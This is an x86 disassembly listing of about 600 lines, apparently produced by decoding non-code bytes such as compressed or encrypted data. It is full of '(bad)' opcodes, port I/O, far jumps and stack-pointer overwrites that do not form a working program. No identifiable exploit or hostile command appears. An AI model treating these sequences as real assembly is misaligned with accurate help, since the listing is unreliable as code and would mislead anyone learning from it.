  426037:	mov    DWORD PTR [ebp+eiz*2+0x3c],edx
  42603b:	mov    eax,0x8ba84398
  426040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426041:	and    bh,dl
  426043:	pushf  
  426044:	jl     0x42603b
  426046:	imul   edx,DWORD PTR [eax+0x57],0x7f
  42604a:	into   
  42604b:	test   al,0x56
  42604d:	inc    edi
  42604e:	popa   
  42604f:	mov    edi,0x27bca728
  426054:	retf   
  426055:	adc    al,0x11
  426057:	adc    edx,DWORD PTR [edx+0x7e]
  42605a:	fstp   DWORD PTR [esp+edx*2-0x18]
  42605e:	jle    0x42604f
  426060:	jmp    0x221e8cfc
  426065:	mov    bl,0x17
  426067:	lahf   
  426068:	in     eax,0xc5
  42606a:	add    ch,bh
  42606c:	push   ss
  42606d:	fstp   DWORD PTR [edx-0x3b]
  426070:	mov    esp,0xca56099
  426075:	push   ebp
  426076:	lock push es
  426078:	sub    ah,BYTE PTR [ebp+ecx*8-0x4b55ec]
  42607f:	push   0x74
  426081:	and    al,0xcf
  426083:	sar    BYTE PTR [ecx+0x360ccdc5],0xa5
  42608a:	jns    0x426013
  42608c:	das    
  42608d:	sub    eax,DWORD PTR ds:0x1f9a7da5
  426093:	dec    eax
  426094:	inc    esi
  426095:	aas    
  426096:	rcr    DWORD PTR ds:0xcb5c861b,cl
  42609c:	mov    dh,0x1e
  42609e:	mov    ecx,0xb0b11eba
  4260a3:	cmp    esp,ebx
  4260a5:	cmp    DWORD PTR [esi+0x78],0xffffffc5
  4260a9:	add    DWORD PTR [ebp-0x5dd37546],edi
  4260af:	sbb    eax,0x18bffe2d
  4260b4:	cmp    ah,ch
  4260b6:	ror    ah,1
  4260b8:	sbb    ah,BYTE PTR [ebx]
  4260ba:	iret   
  4260bb:	leave  
  4260bc:	shl    esi,0x13
  4260bf:	xchg   esp,eax
  4260c0:	cmp    eax,0x135efa0
  4260c5:	push   ebp
  4260c6:	cmp    BYTE PTR gs:[edx],bl
  4260c9:	xchg   edx,eax
  4260ca:	dec    esp
  4260cb:	std    
  4260cc:	ret    0xf3ca
  4260cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260d0:	aaa    
  4260d1:	xchg   ebp,eax
  4260d2:	xchg   edx,eax
  4260d3:	ret    
  4260d4:	or     al,0xd8
  4260d6:	dec    eax
  4260d7:	idiv   BYTE PTR [eax+0x7fa8a05]
  4260dd:	mov    esp,0x45440275
  4260e2:	lea    esi,[edi+0x25]
  4260e5:	mov    dh,BYTE PTR [edi+0x65f0ad5]
  4260eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260ec:	push   ebp
  4260ed:	call   0x9f171280
  4260f2:	cli    
  4260f3:	lods   al,BYTE PTR ds:[esi]
  4260f4:	mov    ah,0x52
  4260f6:	sub    esi,DWORD PTR [eax+0x6bafbed5]
  4260fc:	mov    edi,0xf36dae75
  426101:	mov    al,0xee
  426103:	mov    ebp,DWORD PTR ds:0x753c059c
  426109:	mov    edi,0x78320d64
  42610e:	mov    ebp,0x77fdc7d4
  426113:	jnp    0x4260f6
  426115:	out    0x1,al
  426117:	push   edx
  426118:	(bad)  
  426119:	ss inc eax
  42611b:	loop   0x4260e3
  42611d:	mov    dl,0x18
  42611f:	call   0xaac0:0xdf367f9
  426126:	add    al,0x7
  426128:	imul   esi,DWORD PTR [ebp-0x6f4a7cd3],0x21595b1
  426132:	add    ecx,DWORD PTR [ebx+0x275ff0f2]
  426138:	arpl   WORD PTR [ebp+0x7],si
  42613b:	test   ebp,ecx
  42613d:	jmp    0xb97f:0x2b3684e
  426144:	popf   
  426145:	jne    0x426167
  426147:	pop    ebp
  426148:	mov    ebp,0x78b3fd27
  42614d:	xchg   BYTE PTR [eax],al
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	test   DWORD PTR [esi+ebx*1+0x1d85c47],ebp
  42616d:	add    ah,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ebp-0x7d],al
  426174:	and    DWORD PTR [edi],ecx
  426176:	sbb    eax,0xc248d5b2
  42617b:	imul   BYTE PTR [edx+0x35]
  42617e:	fst    DWORD PTR [edx-0x27]
  426181:	gs pop ebp
  426183:	or     esp,DWORD PTR [esi]
  426185:	push   ebx
  426186:	dec    esi
  426187:	in     al,0x1c
  426189:	or     DWORD PTR [eax],ecx
  42618b:	ja     0x4261a3
  42618d:	cwde   
  42618e:	push   ds
  42618f:	imul   edx,DWORD PTR [eiz*1+0x597b70aa],0x6
  426197:	cmp    ebx,edx
  426199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42619a:	iret   
  42619b:	jb     0x4261de
  42619d:	in     al,0x95
  42619f:	jmp    0x7a8d9280
  4261a4:	jne    0x4261a9
  4261a6:	adc    al,dl
  4261a8:	pusha  
  4261a9:	in     al,0x4d
  4261ab:	mov    DWORD PTR cs:[ecx-0x78],esp
  4261af:	push   esi
  4261b0:	xchg   BYTE PTR ds:0x98e40723,bh
  4261b6:	inc    di
  4261b8:	sti    
  4261b9:	pop    edx
  4261ba:	cmp    DWORD PTR [edx],esp
  4261bc:	outs   dx,DWORD PTR ds:[esi]
  4261bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261bf:	fadd   QWORD PTR [edi-0x1c2e7eee]
  4261c5:	cld    
  4261c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261c7:	mov    ch,0xc0
  4261c9:	pop    ds
  4261ca:	mov    esi,0x15151cf3
  4261cf:	outs   dx,DWORD PTR ds:[esi]
  4261d0:	dec    ecx
  4261d1:	ds xchg esi,eax
  4261d3:	inc    eax
  4261d4:	xor    eax,ecx
  4261d6:	jmp    0x4261b7
  4261d8:	daa    
  4261d9:	mov    esp,0x804de1d5
  4261de:	or     ebp,DWORD PTR [edx+0xf62d518]
  4261e4:	mov    BYTE PTR [ebx+0x5e],ch
  4261e7:	cli    
  4261e8:	clc    
  4261e9:	dec    ebx
  4261ea:	mov    fs,edi
  4261ec:	div    BYTE PTR [eax+0x4bc862d]
  4261f2:	and    ebp,DWORD PTR [esp+ecx*2+0x51]
  4261f6:	jp     0x426189
  4261f8:	add    al,0x82
  4261fa:	inc    edi
  4261fb:	xchg   edx,eax
  4261fc:	or     DWORD PTR [ebp+esi*1+0x6b80ede1],edx
  426203:	pop    ebp
  426204:	popa   
  426205:	pop    edi
  426206:	sar    DWORD PTR ds:0x74496b90,cl
  42620c:	add    eax,0xbc68cfb4
  426211:	sahf   
  426212:	ins    DWORD PTR es:[edi],dx
  426213:	sbb    BYTE PTR [eax-0x49f5c3ea],al
  426219:	stos   DWORD PTR es:[edi],eax
  42621a:	adc    esp,DWORD PTR [ebp+0x65fb346c]
  426220:	es lock pop edi
  426223:	mov    ds:0x2071864,al
  426228:	add    eax,0x8ac8a234
  42622d:	pusha  
  42622e:	add    al,0xe4
  426230:	fwait
  426231:	mov    dl,0xe1
  426233:	push   edx
  426234:	mov    eax,0x8c981d90
  426239:	jb     0x426237
  42623b:	test   ebp,ebp
  42623d:	xlat   BYTE PTR ds:[ebx]
  42623e:	shl    DWORD PTR [edx-0x1b24d7da],1
  426244:	cmp    DWORD PTR [ebx-0x4329cd3b],ebp
  42624a:	dec    edi
  42624b:	sbb    edx,esi
  42624d:	(bad)  
  42624e:	mov    ds:0x60054808,eax
  426253:	rcl    DWORD PTR ds:0x5ee13a4b,0x38
  42625a:	xchg   edx,eax
  42625b:	mov    cl,0xf6
  42625d:	aad    0xdc
  42625f:	cmc    
  426260:	fadd   QWORD PTR [edx]
  426262:	pop    eax
  426263:	and    edx,DWORD PTR [eax]
  426265:	adc    ebp,edx
  426267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426268:	sbb    ah,BYTE PTR [edi+0x5a]
  42626b:	addr16 pop ebx
  42626d:	inc    edi
  42626e:	mov    edi,0x3bf4487c
  426273:	nop    DWORD PTR [ebx]
  426276:	ja     0x426280
  426278:	inc    ebx
  426279:	cld    
  42627a:	and    eax,0xffffffe5
  42627d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42627e:	inc    ebx
  42627f:	sbb    al,0x4c
  426281:	mov    al,ds:0x161d2599
  426286:	or     eax,0x1e7e188d
  42628b:	out    0xb9,eax
  42628d:	xor    edi,ebp
  42628f:	jp     0x4262cb
  426291:	xor    eax,0x5013b61d
  426296:	aam    0xed
  426298:	sub    al,0xda
  42629a:	push   edi
  42629b:	adc    ebx,DWORD PTR [esi]
  42629d:	(bad)  
  42629e:	sub    DWORD PTR [esp+ebp*1-0x7a],edi
  4262a2:	sub    DWORD PTR [eax],ebp
  4262a4:	ds cmp eax,ecx
  4262a7:	out    0x5,al
  4262a9:	xor    bh,bh
  4262ab:	(bad)  
  4262ac:	int    0xa1
  4262ae:	pushf  
  4262af:	or     esp,0x48
  4262b2:	inc    ebx
  4262b3:	dec    edx
  4262b4:	ss out 0x34,eax
  4262b7:	lea    esp,[ebx+eax*2+0x2]
  4262bb:	sbb    ebp,DWORD PTR [eax]
  4262bd:	xchg   ebx,eax
  4262be:	push   DWORD PTR [edi-0x3f]
  4262c1:	or     BYTE PTR [ecx+edx*4-0x5e],dh
  4262c5:	mov    ecx,0x91f70cf9
  4262ca:	jo     0x4262e0
  4262cc:	sar    DWORD PTR [esi],cl
  4262ce:	aad    0x5d
  4262d0:	push   es
  4262d1:	les    eax,FWORD PTR [esi-0x2cc8d006]
  4262d7:	pop    ebp
  4262d8:	outs   dx,BYTE PTR ds:[esi]
  4262d9:	or     BYTE PTR [ebx-0x35f3b8a6],dl
  4262df:	rol    BYTE PTR [edx-0x6209b28e],0x3
  4262e6:	shr    BYTE PTR [ebx+0x68],0xf5
  4262ea:	xor    ecx,ebx
  4262ec:	add    dx,WORD PTR [eax]
  4262ef:	pop    ebp
  4262f0:	outs   dx,BYTE PTR ds:[esi]
  4262f1:	dec    ecx
  4262f2:	repz sub bh,bl
  4262f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262f6:	add    eax,DWORD PTR [edi-0x7825507f]
  4262fc:	mov    ecx,eax
  4262fe:	lods   eax,DWORD PTR ds:[esi]
  4262ff:	inc    edx
  426300:	sbb    DWORD PTR [edx+0x2d],edi
  426303:	pusha  
  426304:	dec    eax
  426305:	adc    bh,BYTE PTR [ebx]
  426307:	in     eax,0xda
  426309:	stos   BYTE PTR es:[edi],al
  42630a:	xchg   cl,bh
  42630c:	cwde   
  42630d:	dec    edx
  42630e:	shl    DWORD PTR [ecx],0xda
  426311:	or     DWORD PTR [edx-0x103d2bee],edx
  426317:	std    
  426318:	ret    0x9501
  42631b:	adc    edx,DWORD PTR ds:0xc8b4f344
  426321:	fisttp DWORD PTR [esi-0x8]
  426324:	sbb    BYTE PTR [esi+ebx*8],cl
  426327:	hlt    
  426328:	data16 aaa 
  42632a:	mov    esp,DWORD PTR [ebp+0x6]
  42632d:	test   eax,0x4d670aa
  426332:	pop    ecx
  426333:	mov    bl,0x39
  426335:	mov    ebp,0xd5bd9230
  42633a:	lods   eax,DWORD PTR ds:[esi]
  42633b:	iret   
  42633c:	mov    al,ds:0xa2e8c718
  426341:	int    0x7f
  426343:	sub    DWORD PTR [edx-0x3c],esi
  426346:	mov    ch,0x77
  426348:	scas   eax,DWORD PTR es:[edi]
  426349:	(bad)  
  42634a:	jnp    0x42631c
  42634c:	loopne 0x42638d
  42634e:	push   ss
  42634f:	(bad)  
  426351:	je     0x4263af
  426353:	jecxz  0x4263a9
  426355:	mov    bh,0xeb
  426357:	adc    eax,0x2a4a2131
  42635c:	das    
  42635d:	mov    ds,WORD PTR [edi+0x2]
  426360:	xor    esp,ecx
  426362:	test   dl,bl
  426364:	fadd   QWORD PTR [eax+0x3e]
  426367:	test   al,0xcd
  426369:	dec    ebp
  42636a:	mov    esi,0x24c70f
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	sar    ecx,cl
  426387:	dec    edi
  426388:	aad    0xf
  42638a:	pop    eax
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ah,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [edi],ah
  426393:	push   es
  426394:	add    ebp,esp
  426396:	aaa    
  426397:	jge    0x4263b9
  426399:	add    BYTE PTR [eax],ch
  42639b:	or     esi,ebp
  42639d:	test   eax,0x69ce2e4f
  4263a2:	or     BYTE PTR [esi+0x31],0xd7
  4263a6:	fsub   DWORD PTR [ecx-0x6b]
  4263a9:	icebp  
  4263aa:	or     eax,0xfa0afbeb
  4263af:	add    edx,edx
  4263b1:	daa    
  4263b2:	adc    edi,DWORD PTR [ecx]
  4263b4:	shr    DWORD PTR [edi],1
  4263b6:	adc    al,0x85
  4263b8:	aam    0x62
  4263ba:	mov    esi,DWORD PTR [ebp-0x5c]
  4263bd:	out    dx,eax
  4263be:	xor    al,0x7c
  4263c0:	ds jo  0x426368
  4263c3:	mov    ebx,0x14973162
  4263c8:	popf   
  4263c9:	sbb    al,0xde
  4263cb:	jno    0x4263b1
  4263cd:	or     edx,ebx
  4263cf:	ins    BYTE PTR es:[edi],dx
  4263d0:	add    eax,0xadbe7e51
  4263d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263d6:	xchg   edx,eax
  4263d7:	pandn  mm0,QWORD PTR [ebx+0xc]
  4263db:	mov    bh,0xaa
  4263dd:	and    edx,DWORD PTR ds:0x7ecc0d2f
  4263e3:	pop    ds
  4263e4:	loope  0x4263f2
  4263e6:	pop    eax
  4263e7:	sub    edx,DWORD PTR [esi+0x2a5cd9db]
  4263ed:	sahf   
  4263ee:	in     eax,0x78
  4263f0:	(bad)  
  4263f1:	dec    ecx
  4263f2:	int    0xdb
  4263f4:	mov    ah,0x14
  4263f6:	loope  0x426461
  4263f8:	jnp    0x4263fc
  4263fa:	ss mov edi,0x66fdda43
  426400:	mov    edx,0x4bc08c06
  426405:	pop    edi
  426406:	dec    ebx
  426407:	cmp    BYTE PTR [eax-0x3e],0xf
  42640b:	or     al,0xd
  42640d:	sub    edx,esp
  42640f:	nop
  426410:	pop    ecx
  426411:	rcr    BYTE PTR [ecx+0x74cf35b7],1
  426417:	mov    ebx,0xd94cf977
  42641c:	iret   
  42641d:	add    bl,al
  42641f:	jecxz  0x4263fa
  426421:	fdiv   st,st(6)
  426423:	call   0xfa60:0xf89e5c04
  42642a:	adc    al,0xa8
  42642c:	pop    esp
  42642d:	mov    ebp,0x66c1eb69
  426432:	fist   DWORD PTR [ebx]
  426434:	dec    esi
  426435:	mov    edi,0x5e70eb14
  42643a:	cmp    BYTE PTR [ebx],ah
  42643c:	sbb    BYTE PTR [esi],al
  42643e:	sti    
  42643f:	cdq    
  426440:	or     DWORD PTR [ebx-0x3edf1793],ecx
  426446:	cdq    
  426447:	pop    ss
  426448:	xchg   ebx,eax
  426449:	inc    esp
  42644a:	add    bh,bl
  42644c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42644d:	js     0x426452
  42644f:	fwait
  426450:	mov    eax,ds:0x6084b9bb
  426455:	(bad)
  426458:	pop    edx
  426459:	sbb    al,bh
  42645b:	fild   WORD PTR [edx+ebp*1]
  42645e:	dec    edi
  42645f:	xor    eax,0x9e00afcc
  426464:	in     eax,dx
  426465:	xchg   edi,eax
  426466:	ss inc edi
  426468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426469:	cwde   
  42646a:	imul   DWORD PTR [edi+edx*1-0x74]
  42646e:	xchg   ecx,eax
  42646f:	cwde   
  426470:	mov    bh,0x85
  426472:	sub    ecx,DWORD PTR [esi]
  426474:	stc    
  426475:	rol    ebx,1
  426477:	push   cs
  426478:	xchg   BYTE PTR [eax],bh
  42647a:	jg     0x426423
  42647c:	or     ah,BYTE PTR ds:0x42d45026
  426482:	sbb    al,0x2b
  426484:	dec    ebx
  426485:	popa   
  426486:	dec    eax
  426487:	sbb    eax,0x6834ddc5
  42648c:	mov    edi,ds
  42648e:	ins    BYTE PTR es:[edi],dx
  42648f:	jl     0x426444
  426491:	mov    al,0x6f
  426493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426494:	dec    eax
  426495:	mov    ebx,0x7842300a
  42649a:	mov    eax,0x25b3c098
  42649f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a0:	or     DWORD PTR [edx+0x1a],ecx
  4264a3:	dec    ebx
  4264a4:	xor    ecx,DWORD PTR [ebp-0x46]
  4264a7:	push   0x54
  4264a9:	xchg   esi,eax
  4264aa:	sub    al,0xfa
  4264ac:	fcom   DWORD PTR [si-0x539b]
  4264b1:	lods   eax,DWORD PTR ds:[esi]
  4264b2:	loope  0x4264ff
  4264b4:	cmp    DWORD PTR [ecx+0x72],esp
  4264b7:	and    eax,edi
  4264b9:	fdivr  QWORD PTR [esi+0x5e54cf87]
  4264bf:	inc    ebp
  4264c0:	sbb    eax,DWORD PTR [ebp-0x7e5ac5af]
  4264c6:	rcr    DWORD PTR ds:0x9106b9c8,1
  4264cc:	push   ds
  4264cd:	mov    dh,0x4
  4264cf:	scas   eax,DWORD PTR es:[edi]
  4264d0:	sahf   
  4264d1:	and    BYTE PTR [di-0x6f89],ah
  4264d6:	icebp  
  4264d7:	xchg   ebx,eax
  4264d8:	add    al,0x5c
  4264da:	adc    eax,ebx
  4264dc:	xchg   ecx,eax
  4264dd:	pop    es
  4264de:	mov    dh,0x86
  4264e0:	dec    edi
  4264e1:	jbe    0x426527
  4264e3:	mov    edx,0x60261db6
  4264e8:	jp     0x4264b4
  4264ea:	sti    
  4264eb:	int3   
  4264ec:	jmp    DWORD PTR fs:[ecx]
  4264ef:	add    al,dl
  4264f1:	adc    al,0xf3
  4264f3:	loop   0x4264c2
  4264f5:	jno    0x4264fb
  4264f7:	add    BYTE PTR [eax],bh
  4264f9:	aas    
  4264fa:	ss push esp
  4264fc:	jno    0x426518
  4264fe:	xchg   DWORD PTR [ecx+0x49130f3f],ebp
  426504:	or     edx,esp
  426506:	push   ebx
  426507:	cmp    DWORD PTR [esi+0x27],ecx
  42650a:	lods   eax,DWORD PTR ds:[esi]
  42650b:	pop    es
  42650c:	(bad)  
  42650e:	in     al,0x2f
  426510:	fild   WORD PTR [eax-0x57070abe]
  426516:	sub    cl,ch
  426518:	or     cl,BYTE PTR [eax]
  42651a:	cwde   
  42651b:	fwait
  42651c:	(bad)  
  42651d:	push   ecx
  42651e:	inc    ebp
  42651f:	xchg   ebp,eax
  426520:	aam    0x20
  426522:	xchg   ebp,eax
  426523:	icebp  
  426524:	mov    edi,0xc4443ee7
  426529:	ror    dl,0x88
  42652c:	sbb    eax,0xd751ba19
  426531:	data16 jb 0x426516
  426534:	pop    ss
  426535:	shl    bl,1
  426537:	(bad)  
  426538:	cmc    
  426539:	aas    
  42653a:	and    bl,BYTE PTR [eax]
  42653c:	adc    dl,BYTE PTR [esi]
  42653e:	push   es
  42653f:	xchg   esp,eax
  426540:	int    0x14
  426542:	jae    0x426564
  426544:	sahf   
  426545:	jmp    0x2b29:0x6597cd4b
  42654c:	cld    
  42654d:	scas   al,BYTE PTR es:[edi]
  42654e:	ret    0xaf2e
  426551:	repnz xchg esi,eax
  426553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426554:	and    ebx,edx
  426556:	mov    ds:0xdba1a321,al
  42655b:	js     0x426505
  42655d:	xchg   esp,eax
  42655e:	int3   
  42655f:	adc    esp,esi
  426561:	call   0x26b4:0x739b225f
  426568:	sbb    esi,DWORD PTR [ebx+ecx*1-0x3f]
  42656c:	mov    cl,0xb
  42656e:	mov    dl,0x42
  426570:	scas   eax,DWORD PTR es:[edi]
  426571:	xor    BYTE PTR [eax],bh
  426573:	fs push cs
  426575:	(bad)  
  426576:	sar    BYTE PTR [edi+0x7d],0x86
  42657a:	or     eax,0x40a2a847
  42657f:	pop    ecx
  426580:	mov    ds:0x2415fc55,al
  426585:	sub    eax,0x8aa0c2a4
  42658a:	xor    BYTE PTR [ecx],al
  42658c:	or     al,0x5c
	...
  42659a:	(bad)  
  42659b:	rol    BYTE PTR [edi],0x37
  42659e:	dec    edi
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426552
  4265a7:	inc    esi
  4265a8:	xor    dl,BYTE PTR cs:[esp+ebx*8+0x1]
  4265ad:	add    ah,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [edx],bl
  4265b3:	(bad)  
  4265b4:	jo     0x4265e2
  4265b6:	aas    
  4265b7:	in     eax,dx
  4265b8:	xor    ah,BYTE PTR [eax+0x46]
  4265bb:	dec    ebp
  4265bc:	xor    BYTE PTR [edx+0x7c527db5],dl
  4265c2:	jmp    0x1479ad3c
  4265c7:	push   fs
  4265c9:	push   esi
  4265ca:	pusha  
  4265cb:	outs   dx,BYTE PTR ds:[esi]
  4265cc:	sub    eax,0x228019e6
  4265d1:	sbb    ebp,0x24cfd248
  4265d7:	or     eax,0xe1acc2fd
  4265dc:	xchg   edx,eax
  4265dd:	cmp    esp,ecx
  4265df:	mov    edi,0x390e788f
  4265e4:	ret    0xa97
  4265e7:	mov    esi,?
  4265e9:	push   ebp
  4265ea:	push   ebx
  4265eb:	scas   eax,DWORD PTR es:[edi]
  4265ec:	adc    al,0xb4
  4265ee:	mov    dl,0xe1
  4265f0:	jne    0x426640
  4265f2:	lods   al,BYTE PTR ds:[esi]
  4265f3:	aam    0x17
  4265f5:	add    dl,BYTE PTR [esi]
  4265f7:	aad    0x3f
  4265f9:	mov    eax,ds:0x45c56c0
  4265fe:	in     al,0x74
  426600:	ror    DWORD PTR [ebx],1
  426602:	and    bh,dl
  426604:	jl     0x42664d
  426606:	in     eax,0xe1
  426608:	ret    
  426609:	gs test al,0xb1
  42660c:	stos   DWORD PTR es:[edi],eax
  42660d:	xchg   esp,eax
  42660e:	mov    ds:0xd367a5b0,eax
  426613:	out    0x10,al
  426615:	push   ecx
  426616:	cwde   
  426617:	sub    BYTE PTR [esi-0x78],bl
  42661a:	loope  0x4265d0
  42661c:	aaa    
  42661d:	scas   al,BYTE PTR es:[edi]
  42661e:	jge    0x4265eb
  426620:	jmp    0x42660a
  426622:	loop   0x42662f
  426624:	scas   al,BYTE PTR es:[edi]
  426625:	sbb    BYTE PTR [edi+eax*8],dl
  426628:	cmp    esp,esi
  42662a:	mov    cl,0xf9
  42662c:	in     al,dx
  42662d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42662e:	les    ecx,FWORD PTR [edi]
  426630:	pushf  
  426631:	mov    al,ds:0x4e91a872
  426636:	mov    dh,0x8b
  426638:	mov    edi,0xd02fd00b
  42663d:	mov    al,ds:0x660a9efe
  426642:	sub    eax,0xce27552c
  426647:	and    al,0x61
  426649:	sbb    dh,BYTE PTR [edx+esi*2]
  42664c:	stos   BYTE PTR es:[edi],al
  42664d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42664e:	cwde   
  42664f:	shl    DWORD PTR [ebp+0xa787c5d],0xbb
  426656:	ins    BYTE PTR es:[edi],dx
  426657:	add    bl,BYTE PTR [ecx]
  426659:	ret    0x364
  42665c:	jnp    0x426642
  42665e:	or     al,BYTE PTR [esi-0xd]
  426661:	call   0xd27fe594
  426666:	hlt    
  426667:	pop    ds
  426668:	mov    edi,0x60d1c7ef
  42666d:	lea    ebx,[esi+0x70acff]
  426673:	(bad)  [ecx+0x2303a252]
  426679:	les    eax,FWORD PTR [esi+0x43]
  42667c:	nop
  42667d:	lock (bad) 
  42667f:	cmp    al,0xb9
  426681:	scas   eax,DWORD PTR es:[edi]
  426682:	pop    edx
  426683:	mov    eax,0xf3c8d8a2
  426688:	push   ds
  426689:	out    dx,al
  42668a:	ret    
  42668b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42668c:	mov    WORD PTR [edi+edx*1+0x68cdae7a],ss
  426693:	cmp    ah,cl
  426695:	outs   dx,DWORD PTR ds:[esi]
  426696:	xchg   DWORD PTR [ebx],edx
  426698:	jno    0x426650
  42669a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42669b:	push   0x34
  42669d:	cld    
  42669e:	sub    eax,eax
  4266a0:	in     al,dx
  4266a1:	out    dx,al
  4266a2:	mov    bl,0xc6
  4266a4:	ja     0x42669f
  4266a6:	mov    bl,0xac
  4266a8:	mov    ds:0xe3828b5f,eax
  4266ad:	jl     0x426727
  4266af:	adc    cl,BYTE PTR [ebx]
  4266b1:	sbb    DWORD PTR [edx+0x60c59042],esp
  4266b7:	mov    ebx,ebp
  4266b9:	and    BYTE PTR [esi-0x7bfaf115],ah
  4266bf:	inc    esp
  4266c0:	(bad)  
  4266c2:	push   ebx
  4266c3:	fnsave [esi-0x5d32f268]
  4266c9:	(bad)  
  4266ca:	jo     0x4266a8
  4266cc:	or     edx,DWORD PTR [ecx-0x4b119329]
  4266d2:	mov    cl,0x75
  4266d4:	push   edi
  4266d5:	icebp  
  4266d6:	imul   esp,DWORD PTR [eax+0x25fa06ec],0x92af22c5
  4266e0:	mov    esp,0x9c6529eb
  4266e5:	fwait
  4266e6:	js     0x42668d
  4266e8:	dec    esi
  4266e9:	add    al,0xa2
  4266eb:	pop    es
  4266ec:	in     al,0x7a
  4266ee:	cmp    eax,0x6d5d5e3
  4266f3:	inc    esi
  4266f4:	push   esi
  4266f5:	test   eax,0x34a31410
  4266fa:	sub    al,0x6a
  4266fc:	and    esi,ecx
  4266fe:	call   0x61278ab2
  426703:	sbb    ebp,DWORD PTR [eax+0x452335c2]
  426709:	jne    0x4266b0
  42670b:	jb     0x4266df
  42670d:	and    BYTE PTR [esi-0x3b],dl
  426710:	int3   
  426711:	ja     0x426702
  426713:	icebp  
  426714:	cmp    al,0x7f
  426716:	cdq    
  426717:	cmp    BYTE PTR [ebp+eiz*2-0x78],0x48
  42671c:	xchg   bh,dl
  42671e:	jl     0x426766
  426720:	jmp    0x41ae:0xc7eeae2
  426727:	adc    esp,DWORD PTR [eax+0x26]
  42672a:	loop   0x4266ad
  42672c:	loop   0x426705
  42672e:	and    edx,DWORD PTR [esi+0x2a]
  426731:	int    0x1
  426733:	add    DWORD PTR [esi-0x52a623a9],eax
  426739:	nop
  42673a:	stc    
  42673b:	scas   eax,DWORD PTR es:[edi]
  42673c:	sub    DWORD PTR [eax],0xb7530209
  426742:	retf   
  426743:	(bad)  
  426744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426745:	push   edx
  426746:	pop    esi
  426747:	xlat   BYTE PTR ds:[ebx]
  426748:	dec    edx
  426749:	neg    DWORD PTR [esi-0x5c]
  42674c:	ror    DWORD PTR ds:0x339e7a00,0x4f
  426753:	xchg   BYTE PTR [edx+0x0],ch
  426756:	lds    ebx,FWORD PTR [eax+0x68b4a1f3]
  42675c:	cmp    eax,0xf07b0df8
  426761:	mov    ebp,fs
  426763:	or     BYTE PTR [edx+0x29],cl
  426766:	sbb    dh,BYTE PTR [ecx+0x44f1a58]
  42676c:	xlat   BYTE PTR ds:[ebx]
  42676d:	mov    ds:0x99903e7b,al
  426772:	mov    ah,0x9e
  426774:	adc    al,0x53
  426776:	push   cs
  426777:	popf   
  426778:	xor    ecx,DWORD PTR [eax]
  42677a:	push   esi
  42677b:	add    eax,0x91448c41
  426780:	fxch   st(6)
  426782:	or     edx,DWORD PTR [edx+0x3235878c]
  426788:	sub    esp,edi
  42678a:	repz dec esp
  42678c:	rcl    DWORD PTR [ebx-0x75],cl
  42678f:	mov    ch,0x9b
  426791:	jl     0x426728
  426793:	jmp    0xf281:0x4731693d
  42679a:	iret   
  42679b:	jns    0x4267d1
  42679d:	mov    al,ds:0x80b795d
  4267a2:	dec    ebx
  4267a3:	mov    eax,0xce109533
  4267a8:	sub    DWORD PTR [ecx-0x5aa9838b],0x0
	...
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	push   edi
  4267c7:	in     eax,dx
  4267c8:	jle    0x426823
  4267ca:	push   eax
  4267cb:	fiadd  WORD PTR [ecx]
  4267cd:	add    ah,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    dl,al
  4267d3:	scas   eax,DWORD PTR es:[edi]
  4267d4:	lods   al,BYTE PTR ds:[esi]
  4267d5:	jo     0x426825
  4267d7:	pop    ecx
  4267d8:	add    edi,DWORD PTR [eax]
  4267da:	data16 jle 0x426834
  4267dd:	pop    ds
  4267de:	push   ecx
  4267df:	xchg   esi,eax
  4267e0:	ja     0x426829
  4267e2:	mov    ebx,fs
  4267e4:	sub    eax,0x2440b769
  4267e9:	icebp  
  4267ea:	mov    al,ds:0x1ab3e4d1
  4267ef:	jo     0x4267d2
  4267f1:	data16 mov cl,0x4c
  4267f4:	in     eax,0x9f
  4267f6:	push   edi
  4267f7:	xor    ebp,DWORD PTR [ecx+0x1e7135e8]
  4267fd:	bound  ebx,QWORD PTR [ecx+0x11]
  426800:	push   cs
  426801:	out    dx,al
  426802:	shl    BYTE PTR [ebp+0x15714854],0x1e
  426809:	xchg   edx,eax
  42680a:	(bad)  
  42680b:	scas   al,BYTE PTR es:[edi]
  42680c:	mov    dh,0xf1
  42680e:	dec    ebp
  42680f:	mov    ah,0xd5
  426811:	add    DWORD PTR [ecx-0x42],ecx
